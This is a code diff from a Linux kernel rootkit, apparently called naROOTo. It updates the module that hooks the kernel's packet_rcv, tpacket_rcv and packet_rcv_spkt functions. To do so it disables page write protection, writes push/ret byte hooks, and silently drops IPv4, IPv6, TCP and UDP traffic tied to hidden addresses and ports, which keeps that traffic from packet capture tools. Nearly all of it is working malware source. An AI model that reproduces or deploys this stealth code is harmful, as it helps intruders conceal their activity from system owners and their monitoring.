@@ -21,11 +21,14 @@
  * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
  */
 
-#include <net/ip.h>
-#include <linux/inet.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/ipv6.h>
+#include <linux/skbuff.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
 
 #include "include.h"
-#include "main.h"
 
 int manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
 int manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
@@ -46,79 +49,111 @@ unsigned long tpacket_rcv_flags;
 spinlock_t packet_rcv_spkt_lock;
 unsigned long packet_rcv_spkt_flags;
 
-/* the 'ret' hook we are using */
-char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
-unsigned int *target = (unsigned int *) (hook + 1);
+/* the template for the 'ret' hook we are using */
+const char hook_template[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
 
-/* code of the original functions that have been overwritten by us */
+/* code of the original functions that will be overwritten by our hook */
 char original_packet_rcv[6];
 char original_tpacket_rcv[6];
 char original_packet_rcv_spkt[6];
 
 /*
- * checks if this specific tcp service is hidden.
+ * Checks a packet's TCP header to determine if the packet should be hidden
  */
 int
-is_port_hidden (struct sk_buff *skb)
+is_tcp_port_hidden (struct tcphdr *tcp_header)
 {
-	struct iphdr *ip_header;
-	struct tcphdr *tcp_header;
+	/* check with the control API if this service is hidden */
+	if (is_tcp_socket_hidden(ntohs(tcp_header->dest))
+		|| is_tcp_socket_hidden(ntohs(tcp_header->source))) {
+		ROOTKIT_DEBUG("Filtered TCP packet detected. Src: %u Dest: %u\n",
+			ntohs(tcp_header->source), ntohs(tcp_header->dest));
+		return 1;
+	} 
+	
+	return 0;
+}
 
-	/* check if this frame contains an IP packet */
-	if (skb->protocol == htons(ETH_P_IP)) {
-		ip_header = (struct iphdr *) skb_network_header(skb);
-		
-		/* check if this is an TCP packet */
-		if (ip_header->protocol == 6) {
-			tcp_header = (struct tcphdr *) skb_transport_header(skb);
-			
-			/* check with the control API if this service is hidden */
-			// TODO: find a way to also filter outgoing packets
-			if (is_service_hidden(ntohs(tcp_header->dest))) {
-				
-				ROOTKIT_DEBUG("Filtered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
-			
-				return 1;
-			}
-			
-			ROOTKIT_DEBUG("Unfiltered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
-		}
-		
+/*
+ * Checks a packet's UDP header to determine if the packet should be hidden
+ */
+int
+is_udp_port_hidden (struct udphdr *udp_header)
+{
+	/* check with the control API if this service is hidden */
+	if (is_udp_socket_hidden(ntohs(udp_header->dest))
+		|| is_udp_socket_hidden(ntohs(udp_header->source))) {
+		ROOTKIT_DEBUG("Filtered UDP packet detected. Src: %u Dest: %u\n",
+			ntohs(udp_header->source), ntohs(udp_header->dest));
+		return 1;
 	}
 
 	return 0;
 }
 
 /*
- * check if we need to hide this particular packet.
+ * Checks if this specific packet should be hidden.
  */
 int
-is_packet_hidden (struct sk_buff *skb)
+is_packet_hidden (struct sk_buff *skb, struct net_device *dev)
 {
 	struct iphdr *ip_header;
+	struct ipv6hdr *ipv6_header;
+	struct tcphdr *tcp_header;
+	struct udphdr *udp_header;
 	
-	/* check if this frame contains an IP packet */
-	if (skb->protocol == htons(ETH_P_IP)) {
-		ip_header = (struct iphdr *) skb_network_header(skb);
-
-		/* check if we have to filter this IP address */
-		if (is_ip_hidden(ip_header->saddr)
-				|| is_ip_hidden(ip_header->daddr)) {
-				
-			ROOTKIT_DEBUG("Filtered IP address.\n");
+	if (ntohs(skb->protocol) == ETH_P_IP) { /* IPv4 */
+		ip_header = ip_hdr(skb);
+		
+		/* check if we have to filter this IPv4 address */
+               	if (is_ip_hidden(ip_header->saddr)
+                       	|| is_ip_hidden(ip_header->daddr)) {
+                       	ROOTKIT_DEBUG("Filtered IPv4 address.\n");
+                        return 1;
+       	        }
 			
-			return 1;
-		}
+		/* check if this is a TCP or an UDP packet */
+		if (ip_header->protocol == IPPROTO_TCP) {
+			tcp_header = (struct tcphdr *) ((__u32 *) ip_header + ip_header->ihl);
+
+			if(is_tcp_port_hidden(tcp_header)) {
+				return 1;
+			}
+		} else if (ip_header->protocol == IPPROTO_UDP) {
+			udp_header = (struct udphdr *) ((__u32 *) ip_header + ip_header->ihl);
+
+			if(is_udp_port_hidden(udp_header)) {
+				return 1;
+			}
+		} 
+			
+		
+	} else if(ntohs(skb->protocol) == ETH_P_IPV6) { /* IPv6 */
+		ipv6_header = ipv6_hdr(skb);
+		
+		/* check if this is an TCP packet */
+                if (ipv6_header->nexthdr == IPPROTO_TCP) {
+			tcp_header = (struct tcphdr *) ((__u32 *) ipv6_header + 10);
+
+			if(is_tcp_port_hidden(tcp_header)) {
+				return 1;
+			}
+                }
+	} else {
+		printk("Unknown protocol: %X", ntohs(skb->protocol));
 	}
-	
-	/* check if this is a filtered service */
-	return is_port_hidden(skb);
+
+	return 0;
 }
 
 /* hooks 'packet_rcv' */
 void
 hook_packet_rcv (void)
 {
+	char hook[6];
+	unsigned int *target = (unsigned int *) (hook + 1);
+	memcpy(hook, hook_template, sizeof(char)*6);
+
 	/* disable write protection */
 	disable_page_protection();
 
@@ -137,6 +172,10 @@ hook_packet_rcv (void)
 void
 hook_tpacket_rcv (void)
 {
+	char hook[6];
+	unsigned int *target = (unsigned int *) (hook + 1);
+	memcpy(hook, hook_template, sizeof(char)*6);
+
 	/* disable write protection */
 	disable_page_protection();
 
@@ -155,6 +194,10 @@ hook_tpacket_rcv (void)
 void
 hook_packet_rcv_spkt (void)
 {
+	char hook[6];
+	unsigned int *target = (unsigned int *) (hook + 1);
+	memcpy(hook, hook_template, sizeof(char)*6);
+
 	/* disable write protection */
 	disable_page_protection();
 
@@ -215,22 +258,19 @@ unhook_packet_rcv_spkt (void)
 int
 manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
-	int ret;
+	int ret = 0;
 	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
 
 	/* check if we need to hide this packet */	
-	if(is_packet_hidden(skb)) {	
+	if(is_packet_hidden(skb, dev)) {	
 		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n");
-		
-		spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
-		return 0; 
+	} else {
+		/* restore original, call it, hook again */
+		unhook_packet_rcv();
+		ret = packet_rcv(skb,dev,pt,orig_dev);
+		hook_packet_rcv();
 	}
 
-	/* restore original, call it, hook again */
-	unhook_packet_rcv();
-	ret = packet_rcv(skb,dev,pt,orig_dev);
-	hook_packet_rcv();
-	
 	/* return the correct value of the original function */
 	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 	return ret;	
@@ -240,22 +280,19 @@ manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct pack
 int
 manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
-	int ret;
+	int ret = 0;
 	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
 	
 	/* check if we need to hide this packet */
-	if(is_packet_hidden(skb)) {		
+	if(is_packet_hidden(skb, dev)) {		
 		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n");
-		
-		spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
-		return 0; 
-	}
+	} else {
+		/* restore original, call it, hook again */
+		unhook_tpacket_rcv();
+		ret = tpacket_rcv(skb,dev,pt,orig_dev);
+		hook_tpacket_rcv();
+	}	
 
-	/* restore original, call it, hook again */
-	unhook_tpacket_rcv();
-	ret = tpacket_rcv(skb,dev,pt,orig_dev);
-	hook_tpacket_rcv();
-	
 	/* return the correct value of the original function */
 	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 	return ret;	
@@ -265,21 +302,18 @@ manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct pac
 int
 manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
 {
-	int ret;
+	int ret = 0;
 	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 	
 	/* check if we need to hide this packet */	
-	if(is_packet_hidden(skb)) {	
+	if(is_packet_hidden(skb, dev)) {	
 		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n");
-		
-		spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
-		return 0; 
-	} 
-
-	/* restore original, call it, hook again */
-	unhook_packet_rcv_spkt();
-	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
-	hook_packet_rcv_spkt();
+	} else {
+		/* restore original, call it, hook again */
+		unhook_packet_rcv_spkt();
+		ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
+		hook_packet_rcv_spkt();
+	}
 
 	/* return the correct value of the original function */
 	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
